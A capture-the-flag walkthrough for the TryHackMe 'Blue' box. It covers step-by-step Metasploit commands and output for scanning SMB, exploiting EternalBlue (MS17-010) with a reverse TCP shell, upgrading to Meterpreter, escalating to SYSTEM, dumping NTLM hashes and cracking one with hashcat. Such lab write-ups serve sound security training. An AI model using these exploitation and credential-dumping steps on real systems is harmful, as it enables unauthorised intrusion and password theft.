@@ -1,0 +1,386 @@
+This is a box that is available on Try Hack Me. 
+
+1. Scanning and Enumeration
+
+run: 
+nmap -T4 -p 0-1000 -A IP (runs a scan on the ports between 0 and 1000 TCP)
+
+open ports: 
+
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+
+Host script results:
+|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:23:57:c1:70:11 (unknown)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: Jon-PC
+|   NetBIOS computer name: JON-PC\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2021-08-24T01:35:56-05:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-08-24 07:35:56
+|_  start_date: 2021-08-24 07:35:12
+
+We need to investigate SMB, which seems to be running on the machine. So, we will use msfconsole and smbclient to see if we can find info on the machine. 
+
+msfconsole
+search smb
+use auxiliary/scanner/smb/smb_version
+options
+SET RHOSTS IP
+run
+
+[+] 10.10.152.106:445     - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)
+[*] 10.10.152.106:445     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+smbclient
+
+smbclient \\\\10.10.152.106\\WORKGROUP
+WARNING: The "syslog" option is deprecated
+Enter WORKGROUP\root's password: 
+Anonymous login successful
+tree connect failed: NT_STATUS_BAD_NETWORK_NAME
+
+Based on the above, it seems that SMB is running v1. So, we need to see if there are any vulnerabilities for SMB v1. 
+
+https://stealthbits.com/blog/what-is-smbv1-and-why-you-should-disable-it/ - It seems there are a lot of vulnerabilities in SMB v1, but the most well known seems to be EternalBlue, also known as MS17-010. 
+
+If we search for EternalBlue on msfconsole, there is a scanner to check if a system is vulnerable to that.
+
+msfconsole
+search eternalblue
+use auxiliary/scanner/smb/smb_ms17_010
+options
+SET RHOSTS IP
+run
+
+auxiliary(scanner/smb/smb_ms17_010) > run
+
+[+] 10.10.152.106:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+[*] 10.10.152.106:445     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+So, it seems the machine may be vulnerable to MS17-010 (EternalBlue). Let´s see if there are any exploits available.
+
+https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/ 
+https://www.exploit-db.com/exploits/42315
+
+Since Rapid7 develops Metasploit, we are going to focus on that. 
+
+There is nothing much else going on on this machine, so we will move to exploitation.
+
+2. Exploitation:
+
+msfconsole
+search eternalblue
+use exploit/windows/smb/ms17_010_eternalblue
+we can check if there are types of shells available using:
+set payload windows/x64/ (Tab to see options)
+of course, it defaults to the Meterpreter shell, which is what we want.
+but, in this instance, lets set the shell to:
+set payload windows/x64/shell/reverse_tcp
+options
+set TARGET <ID>
+show options
+SET RHOSTS IP
+run
+
+now, we have a normal shell, but it would be nice to upgrade that to a meterpreter shell. So, lets do that.
+
+3. Post Exploitation
+
+So, to change command shell to meterpreter, do the following. 
+
+Send the shell to the background. 
+CTRL+z
+then
+search shell_to_meterpreter
+use post/multi/manage/shell_to_meterpreter
+options
+we need to set the session
+run
+sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type               Information                                                                       Connection
+  --  ----  ----               -----------                                                                       ----------
+  1         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.10.69.63:4444 -> 10.10.152.106:49214 (10.10.152.106)
+
+
+it shows the session you have sent to the background. 
+
+run:
+set SESSION 1
+options
+set LHOST IP
+options
+run
+
+then, run
+sessions -l 
+
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                                                       Connection
+  --  ----  ----                     -----------                                                                       ----------
+  1         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.10.69.63:4444 -> 10.10.152.106:49214 (10.10.152.106)
+  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC                                                      10.10.69.63:4433 -> 10.10.152.106:49229 (10.10.152.106)
+
+to interact with our meterpreter shell, type
+
+sessions -i 2
+
+msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > sysinfo
+Computer        : JON-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 0
+Meterpreter     : x86/windows
+meterpreter > 
+
+https://www.yeahhub.com/metasploit-upgrading-normal-command-shell-meterpreter-shell/ (how to change from command shell to meterpreter). 
+
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > 
+
+run: ps
+
+2784  2060  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
+ 2816  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
+ 2828  684   cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
+
+We can now migrate to one of the other running processes, like Powershell.exe in this case.
+
+meterpreter > migrate 2784
+[*] Migrating from 684 to 2784...
+[*] Migration completed successfully.
+meterpreter > 
+
+Cracking:
+
+We can now crack the user passwords. To do that, we can run hashdump.
+
+meterpreter > run post/windows/gather/hashdump 
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+Jon:"Nah boi, I ain't sharing nutting with you"
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+but, this just prints to the screen. We need to crack them, so:
+
+meterpreter > background
+[*] Backgrounding session 2...
+msf5 post(multi/manage/shell_to_meterpreter) > use post/windows/gather/hashdump
+
+options
+we need the session id for the meterpreter session. 
+
+sessions -l 
+
+set SESSION ID
+
+options
+
+msf5 post(windows/gather/hashdump) > set SESSION 2
+SESSION => 2
+msf5 post(windows/gather/hashdump) > options
+
+Module options (post/windows/gather/hashdump):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  2                yes       The session to run this module on.
+
+msf5 post(windows/gather/hashdump) > 
+
+type: run
+
+f5 post(windows/gather/hashdump) > run
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+Jon:"Nah boi, I ain't sharing nutting with you"
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+
+[*] Post module execution completed
+msf5 post(windows/gather/hashdump) > 
+
+We can run creds to see which passwords are stored in the database. 
+
+msf5 post(windows/gather/hashdump) > creds 
+Credentials
+===========
+
+host           origin         service        public         private                                                            realm  private_type  JtR Format
+----           ------         -------        ------         -------                                                            -----  ------------  ----------
+10.10.152.106  10.10.152.106  445/tcp (smb)  administrator  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm
+10.10.152.106  10.10.152.106  445/tcp (smb)  guest          aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0         NTLM hash     nt,lm
+10.10.152.106  10.10.152.106  445/tcp (smb)  jon            aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d         NTLM hash     nt,lm
+
+We can now use John The Ripper to crack the password. 
+
+use auxiliary/analyze/jtr_windows_fast
+options
+We will leave the defaults and hit run.
+However, this doesn´t work, so we need to set a default wordlist. 
+
+set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
+
+Again, this doesnt work, so we try john the ripper in terminal. Put the hash into a password file and then run:
+
+Hint: We need to understand how Windows handles hashes. 
+
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+
+This can be split:
+
+aad3b435b51404eeaad3b435b51404ee - is the LM part
+ffb43f0de35be4d9917ac0cc8ad57f8d - is the NT part
+
+hashcat is a better option then John the Ripper here:
+
+hashcat -m 1000 password /usr/share/wordlists/rockyou.txt (-m 1000 is the mode for NTLM).
+hashcat (v6.1.1-66-g6a419d06) starting...
+
+* Device #2: Outdated POCL OpenCL driver detected!
+
+This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
+You can use --force to override this, but do not report related errors.
+
+OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
+==================================================================
+* Device #1: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, 3878/3942 MB (985 MB allocatable), 2MCU
+
+OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
+===========================================================================================================================
+* Device #2: pthread-Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, skipped
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers applied:
+* Zero-Byte
+* Early-Skip
+* Not-Salted
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+* Raw-Hash
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
+If you want to switch to optimized backend kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Hardware monitoring interface not found on your system.
+Watchdog: Temperature abort trigger disabled.
+
+Host memory required for this attack: 0 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 1 sec
+
+ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22        
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: NTLM
+Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
+Time.Started.....: Tue Aug 24 09:56:52 2021 (3 secs)
+Time.Estimated...: Tue Aug 24 09:56:55 2021 (0 secs)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  4142.5 kH/s (0.20ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 10201088/14344384 (71.12%)
+Rejected.........: 0/10201088 (0.00%)
+Restore.Point....: 10199040/14344384 (71.10%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: alsina521 -> alphasanag
+
+Started: Tue Aug 24 09:56:22 2021
+Stopped: Tue Aug 24 09:56:55 2021
+root@ip-10-10-247-4:~# 
+
+
+Flags: 
+
+Flag1: 
+
+Root of the system is C:/, so pwd and then cd .. cd ..
+in C:/ we can cat the flag1 file. 
+
+Flag2: 
+
+passwords are stored in: C:/Windows/system32/config/ and flag2.txt is located there. 
+
+flag{sam_database_elevated_access}
+
+Flag3:
+
+meterpreter > ls
+Listing: C:\Users\Jon\Documents
+===============================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   0     dir   2018-12-13 03:13:31 +0000  My Music
+40777/rwxrwxrwx   0     dir   2018-12-13 03:13:31 +0000  My Pictures
+40777/rwxrwxrwx   0     dir   2018-12-13 03:13:31 +0000  My Videos
+100666/rw-rw-rw-  402   fil   2018-12-13 03:13:45 +0000  desktop.ini
+100666/rw-rw-rw-  37    fil   2018-12-13 03:49:18 +0000  flag3.txt
+
+meterpreter > cat flag3.txt 
+flag{admin_documents_can_be_valuable}meterpreter > 
